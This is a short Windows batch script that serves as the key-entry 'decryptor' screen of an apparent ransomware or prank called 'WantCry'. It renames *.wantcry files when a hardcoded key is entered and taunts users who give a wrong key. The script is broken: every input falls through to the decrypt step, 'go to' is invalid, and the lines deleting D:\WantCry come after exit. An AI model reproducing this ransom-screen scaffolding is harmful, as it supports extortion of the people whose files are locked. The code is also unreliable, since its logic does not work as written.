@echo off
color 02
title Input Key
echo  ----------------------------------------------
echo       Input your key to decrypt files.
echo  ----------------------------------------------
set /p key=
if %key%==1z3c5b6m0n8v1KhaqTaQua5Sajws!2gsswGosekLo8nd goto decrypt
:decrypt
echo You have successfuly decrypt your files!
ren *.wantcry *.* 
pause 
exit
del D:\WantCry
if not %key% go to Crash
:Crash 
echo Wrong Key!
echo Stay happily with your encrypted files...
pause 
exit 
del D:\WantCry
